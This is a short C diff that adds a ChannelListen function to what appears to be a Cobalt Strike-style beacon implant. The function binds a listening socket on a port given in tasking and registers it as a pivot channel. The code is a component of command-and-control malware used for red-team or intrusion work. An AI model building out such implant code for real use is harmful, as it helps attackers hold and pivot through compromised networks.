@@ -128,3 +128,19 @@ void ChannelLSocketTcpPivot(char* buffer, int length)
 	ChannelAdd(sock, newId, 0, CHANNEL_TYPE_TCP_PIVOT, port, CHANNEL_STATE_2);
 }
 
+void ChannelListen(char* buffer, int length)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	int id = BeaconDataInt(&parser);
+	short port = BeaconDataShort(&parser);
+
+	SOCKET sock = ChannelSocketCreateAndBind(INADDR_ANY, port, 1);
+	if (sock == INVALID_SOCKET)
+	{
+		BeaconOutput(CALLBACK_CLOSE, buffer, sizeof(id));
+		return;
+	}
+
+	ChannelAdd(sock, id, 180000, CHANNEL_TYPE_LISTEN, port, CHANNEL_STATE_2);
+}
